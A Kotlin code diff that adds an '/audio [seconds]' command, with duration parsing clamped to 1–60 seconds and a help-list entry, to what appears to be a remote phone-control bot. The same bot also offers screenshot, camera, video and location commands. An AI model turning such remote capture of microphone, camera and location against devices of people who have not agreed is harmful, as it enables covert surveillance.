@@ -40,6 +40,22 @@ object CmdHelpers {
         return raw.coerceIn(1, VIDEO_MAX_SECONDS)
     }
 
+    // ── /audio ────────────────────────────────────────────────────────────
+
+    const val AUDIO_DEFAULT_SECONDS: Int = 10
+    const val AUDIO_MAX_SECONDS: Int = 60
+
+    /**
+     * `args[0]` is an integer count of seconds; clamped to [1, 60].
+     * Audio max is longer than video because the files are tiny by
+     * comparison (≈1 MB/min at 128 kbps, well under TempFile's 50 MiB
+     * cap even for the full duration).
+     */
+    fun parseAudioSeconds(args: List<String>): Int {
+        val raw = args.firstOrNull()?.toIntOrNull() ?: AUDIO_DEFAULT_SECONDS
+        return raw.coerceIn(1, AUDIO_MAX_SECONDS)
+    }
+
     // ── /location ─────────────────────────────────────────────────────────
 
     data class LocationSnapshot(
@@ -187,6 +203,7 @@ object CmdHelpers {
         "/screenshot",
         "/photo [front|back]",
         "/video [seconds]",
+        "/audio [seconds]",
         "/location",
         "/say <text>",
         "/notify <title>|<body>",
